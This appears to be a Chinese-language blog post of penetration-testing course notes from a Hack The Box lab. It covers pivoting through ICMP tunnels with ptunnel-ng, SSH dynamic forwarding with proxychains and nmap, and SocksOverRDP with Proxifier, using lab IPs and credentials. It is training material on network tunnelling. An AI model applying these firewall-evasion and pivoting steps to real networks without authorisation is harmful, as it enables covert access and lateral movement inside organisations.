+<h1 id="ICMP-Tunneling-with-SOCKS"><a href="#ICMP-Tunneling-with-SOCKS" class="headerlink" title="ICMP Tunneling with SOCKS"></a>ICMP Tunneling with SOCKS</h1><p>ICMP隧道将您的流量封装在包含回显请求和响应的ICMP数据包中。ICMP隧道只有在防火墙网络中允许ping响应时才能工作。当防火墙网络中的主机被允许对外部服务器进行ping时，它可以将其流量封装在ping回显请求中，并将其发送到外部服务器。外部服务器可以验证此流量并发送适当的响应，这对于数据泄露和创建到外部服务器的数据透视隧道非常有用。 我们将使用ptunnel ng工具在Ubuntu服务器和攻击主机之间创建一个隧道。一旦创建了隧道，我们将能够通过 <a target="_blank" rel="noopener" href="https://github.com/utoni/ptunnel-ng">ptunnel-ng</a> 客户端代理我们的流量。我们可以在目标pivot主机上启动ptunnel ng服务器。让我们从设置ptunnel ng开始。</p>
+<h2 id="Setting-Up-amp-Using-ptunnel-ng"><a href="#Setting-Up-amp-Using-ptunnel-ng" class="headerlink" title="Setting Up &amp; Using ptunnel-ng"></a>Setting Up &amp; Using ptunnel-ng</h2><pre><code class="shell-session">Tanin@htb[/htb]$ git clone https://github.com/utoni/ptunnel-ng.git
+</code></pre>
+<h4 id="Building-Ptunnel-ng-with-Autogen-sh"><a href="#Building-Ptunnel-ng-with-Autogen-sh" class="headerlink" title="Building Ptunnel-ng with Autogen.sh"></a>Building Ptunnel-ng with Autogen.sh</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo ./autogen.sh 
+</code></pre>
+<p>在运行autogen.sh之后，可以从客户端和服务器端使用ptunnel ng。我们现在需要将回购从我们的攻击主机转移到目标主机。如前几节所述，我们可以使用SCP来传输文件。如果我们想传输整个repo和其中包含的文件，我们需要将-r选项与SCP一起使用。 将Ptunnel ng传输到数据透视主机</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ scp -r ptunnel-ng ubuntu@10.129.202.64:~/
+</code></pre>
+<h4 id="Starting-the-ptunnel-ng-Server-on-the-Target-Host"><a href="#Starting-the-ptunnel-ng-Server-on-the-Target-Host" class="headerlink" title="Starting the ptunnel-ng Server on the Target Host"></a>Starting the ptunnel-ng Server on the Target Host</h4><pre><code class="shell-session">ubuntu@WEB01:~/ptunnel-ng/src$ sudo ./ptunnel-ng -r10.129.202.64 -R22
+
+[sudo] password for ubuntu: 
+./ptunnel-ng: /lib/x86_64-linux-gnu/libselinux.so.1: no version information available (required by ./ptunnel-ng)
+[inf]: Starting ptunnel-ng 1.42.
+[inf]: (c) 2004-2011 Daniel Stoedle, &lt;daniels@cs.uit.no&gt;
+[inf]: (c) 2017-2019 Toni Uhlig,     &lt;matzeton@googlemail.com&gt;
+[inf]: Security features by Sebastien Raveau, &lt;sebastien.raveau@epita.fr&gt;
+[inf]: Forwarding incoming ping packets over TCP.
+[inf]: Ping proxy is listening in privileged mode.
+[inf]: Dropping privileges now.
+</code></pre>
+<p>-r后面的IP地址应该是我们希望ptunnel ng接受连接的IP。在这种情况下，我们将使用从我们的攻击主机可以访问的任何IP。在实际参与过程中使用同样的想法和考虑会使我们受益。 回到攻击主机上，我们可以尝试连接到ptunnel ng服务器（-p＜ipAddress-Target＞），但要确保通过本地端口2222（-l2222）进行连接。通过本地端口2222连接允许我们通过ICMP隧道发送流量。</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
+
+[inf]: Starting ptunnel-ng 1.42.
+[inf]: (c) 2004-2011 Daniel Stoedle, &lt;daniels@cs.uit.no&gt;
+[inf]: (c) 2017-2019 Toni Uhlig,     &lt;matzeton@googlemail.com&gt;
+[inf]: Security features by Sebastien Raveau, &lt;sebastien.raveau@epita.fr&gt;
+[inf]: Relaying packets from incoming TCP streams.
+</code></pre>
+<p>随着ptunnel ng ICMP隧道的成功建立，我们可以尝试通过本地端口2222（-p2222）使用SSH连接到目标。</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ ssh -p2222 -lubuntu 127.0.0.1
+</code></pre>
+<p>如果配置正确，我们将能够通过ICMP隧道输入凭据并进行SSH会话。 在连接的客户端和服务器端，我们会注意到ptunnel ng为我们提供了与通过ICMP隧道的流量相关的会话日志和流量统计信息。这是我们可以使用ICMP确认流量从客户端传递到服务器的一种方式。</p>
+<h4 id="Enabling-Dynamic-Port-Forwarding-over-SSH"><a href="#Enabling-Dynamic-Port-Forwarding-over-SSH" class="headerlink" title="Enabling Dynamic Port Forwarding over SSH"></a>Enabling Dynamic Port Forwarding over SSH</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ssh -D 9050 -p2222 -lubuntu 127.0.0.1
+
+ubuntu@127.0.0.1&#39;s password: 
+Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
+&lt;snip&gt;
+</code></pre>
+<p>我们可以使用带有Nmap的proxychains扫描内部网络上的目标（172.16.5.x）。根据我们的发现，我们可以尝试连接到目标。</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ proxychains nmap -sV -sT 172.16.5.19 -p3389
+</code></pre>
+<h2 id="Network-Traffic-Analysis-Considerations"><a href="#Network-Traffic-Analysis-Considerations" class="headerlink" title="Network Traffic Analysis Considerations"></a>Network Traffic Analysis Considerations</h2><p>重要的是，我们要确认我们正在使用的工具是否如广告所示，并且我们已经设置并正确操作了它们。在使用ICMP隧道通过本节中教导的不同协议对流量进行隧道传输的情况下，我们可以从使用Wireshark等数据包分析器分析生成的流量中受益。仔细看一下下面的短片。</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309041725504.gif" alt="img"></p>
+<p>在这个片段的第一部分中，通过SSH建立连接，而不使用ICMP隧道。我们可能会注意到，TCP&amp;SSHv2流量被捕获。 剪辑中使用的命令：<a href="mailto:&#x73;&#x73;&#x68;&#117;&#x62;&#117;&#x6e;&#116;&#117;&#x40;&#x31;&#48;&#46;&#49;&#50;&#57;&#46;&#x32;&#x30;&#x32;&#x2e;&#54;&#52;">&#x73;&#x73;&#x68;&#117;&#x62;&#117;&#x6e;&#116;&#117;&#x40;&#x31;&#48;&#46;&#49;&#50;&#57;&#46;&#x32;&#x30;&#x32;&#x2e;&#54;&#52;</a> 在本片段的第二部分中，使用ICMP隧道通过SSH建立连接。请注意执行此操作时捕获的流量类型。 剪辑中使用的命令：ssh-p222-lubuntu 127.0.0.1</p>
+<h1 id="RDP-and-SOCKS-Tunneling-with-SocksOverRDP"><a href="#RDP-and-SOCKS-Tunneling-with-SocksOverRDP" class="headerlink" title="RDP and SOCKS Tunneling with SocksOverRDP"></a>RDP and SOCKS Tunneling with SocksOverRDP</h1><p>在评估过程中，有时我们可能仅限于Windows网络，并且可能无法使用SSH进行数据透视。在这种情况下，我们必须使用适用于Windows操作系统的工具。SocksOverRDP是一个使用Windows远程桌面服务功能中的动态虚拟频道（DVC）的工具示例。DVC负责通过RDP连接对数据包进行隧道传输。使用此功能的一些示例是剪贴板数据传输和音频共享。然而，此功能也可用于通过网络传输任意数据包。我们可以使用SocksOverRDP来传输我们的自定义数据包，然后通过它进行代理。我们将使用工具Proxifier作为我们的代理服务器。 我们可以从将适当的二进制文件下载到我们的攻击主机开始执行此攻击。在我们的攻击主机上拥有二进制文件将使我们能够将它们转移到需要的每个目标。我们需要：</p>
+<p> <a target="_blank" rel="noopener" href="https://github.com/nccgroup/SocksOverRDP/releases">SocksOverRDP x64 Binaries</a>二进制文件</p>
+<p><a target="_blank" rel="noopener" href="https://www.proxifier.com/download/#win-tab">Proxifier Portable Binary</a></p>
+<p> 我们可以查找ProxifierPE.zip 然后，我们可以使用xfreerdp连接到目标，并将SocksOverRDP64.zip文件复制到目标。然后，我们需要从Windows目标加载使用regsvr32.exe的SocksOverRDP.dll。</p>
+<h4 id="Loading-SocksOverRDP-dll-using-regsvr32-exe"><a href="#Loading-SocksOverRDP-dll-using-regsvr32-exe" class="headerlink" title="Loading SocksOverRDP.dll using regsvr32.exe"></a>Loading SocksOverRDP.dll using regsvr32.exe</h4><pre><code class="cmd-session">C:\Users\htb-student\Desktop\SocksOverRDP-x64&gt; regsvr32.exe SocksOverRDP-Plugin.dll
+</code></pre>
+<p>现在，我们可以使用mstsc.exe通过RDP连接到172.16.5.19，我们应该会收到一个提示，即SocksOverRDP插件已启用，它将在127.0.0.1:1080上侦听。我们可以使用胜利者的凭据：pass@123连接到172.16.5.19。</p>
+<p>我们需要将SocksOverRDP64.zip或仅将SocksOverRDP-Server.exe传输到172.16.5.19。然后，我们可以使用管理员权限启动SocksOverRDP-Server.exe。</p>
+<p>当我们回到我们的立足点目标并查看Netstat时，我们应该会看到我们的SOCKS侦听器在127.0.0.1:1080。</p>
+<pre><code class="cmd-session">C:\Users\htb-student\Desktop\SocksOverRDP-x64&gt; netstat -antb | findstr 1080
+
+  TCP    127.0.0.1:1080         0.0.0.0:0              LISTENING
+</code></pre>
+<p>启动我们的侦听器后，我们可以将Proxizer便携式传输到Windows 10目标（在10.129.x.x网络上），并将其配置为将我们的所有数据包转发到127.0.0.1:1080。Proxifier将通过给定的主机和端口路由流量。有关配置Proxifier的快速演练，请参阅下面的片段。</p>
+<h4 id="Configuring-Proxifier"><a href="#Configuring-Proxifier" class="headerlink" title="Configuring Proxifier"></a>Configuring Proxifier</h4><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309041754536.gif" alt="img"></p>
+<p>配置并运行Proxizer后，我们可以启动mstsc.exe，它将使用Proxizer通过127.0.0.1:1080将我们的所有流量进行枢轴传输，这将通过RDP将其传输到172.16.5.19，然后通过SocksOverRDP-server.exe将其路由到172.16.6.155。</p>
+<h4 id="RDP-Performance-Considerations"><a href="#RDP-Performance-Considerations" class="headerlink" title="RDP Performance Considerations"></a>RDP Performance Considerations</h4><p>当在约定中与RDP会话交互时，我们可能会发现自己在给定会话中遇到性能缓慢的问题，尤其是当我们同时管理多个RDP会话时。如果是这种情况，我们可以访问mstsc.exe中的“体验”选项卡，并将“性能”设置为“调制解调器”。</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309041755688.png" alt="img"></p>
+</article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><em></em><a class="button is-default" href="/2023/09/01/Broken-Authentication/" title="Broken Authentication"><span class="has-text-weight-semibold">Next: Broken Authentication</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="https://github.com/Taninluv/Taninluv.github.io" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/Taninluv"><i class="iconfont icon-github"></i></a><!-- Ins--><!-- RSS--><!-- 知乎--><!-- 领英--><!-- 脸书--></section><p><span>Copyright ©</span><span> Taninluv 2023</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by Hexo &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="Hexo theme author" target="_blank" rel="noopener" href="//github.com/haojen">Theme by Haojen&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" target="_blank" rel="noopener" href="https://github.com/haojen/hexo-theme-Claudia" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/jquery-3.6.1.min.js"></script><script src="/js/jquery-fancybox.min.js"></script><script src="/js/img_zoom.js"></script><script src="/js/post.js"></script></body></html>
